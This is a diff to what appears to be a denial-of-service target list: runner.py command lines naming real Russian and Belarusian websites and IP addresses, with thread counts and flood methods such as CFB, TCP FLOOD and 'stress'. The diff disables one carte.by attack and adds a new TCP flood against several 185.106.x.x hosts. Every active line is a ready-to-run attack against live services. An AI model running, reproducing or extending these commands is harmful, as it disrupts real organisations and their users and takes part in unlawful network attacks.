@@ -6,7 +6,7 @@
 #runner.py http://rusvesna.su/ http://m.rusvesna.su/ -t 800 --http-methods CFB CFBUAM
 
 # https://carte.by/vitebsk/dostavka/
-runner.py https://carte.by/source/front/api.js https://carte.by/minsk/hpl/export/ https://carte.by/vitebsk/dostavka/ 193.176.182.165:80 193.176.182.165:443 tcp://193.176.182.165:80 tcp://193.176.182.165:443 -t 2500 -p 1200 --rpc 100 --http-methods get stress head --debug
+#runner.py https://carte.by/source/front/api.js https://carte.by/minsk/hpl/export/ https://carte.by/vitebsk/dostavka/ 193.176.182.165:80 193.176.182.165:443 tcp://193.176.182.165:80 tcp://193.176.182.165:443 -t 2500 -p 1200 --rpc 100 --http-methods get stress head --debug
 
 ### smotrim.ru https://t.me/c/1624648668/85
 #runner.py tcp://80.249.129.244:443 tcp://80.249.129.244:80 -t 1000  --http-methods TCP FLOOD
@@ -19,3 +19,5 @@ runner.py https://carte.by/source/front/api.js https://carte.by/minsk/hpl/export
 
 ###Везёт всем - онлайн-сервис по грузоперевозкам.
 runner.py https://www.vezetvsem.ru/ 89.108.106.50:80 89.108.106.50:443 https://89.108.106.50:443 tcp://89.108.106.50:22 tcp://89.108.106.50:80 tcp://89.108.106.50:443 -t 500 --http-methods get stress
+
+runner.py tcp://185.106.172.117:53 tcp://185.106.172.117:80 tcp://185.106.173.65:53 tcp://185.106.173.65:80 tcp://185.106.175.109:53 tcp://185.106.175.109:80 tcp://185.106.175.72:53 tcp://185.106.175.72:80 -t 300 --http-methods TCP
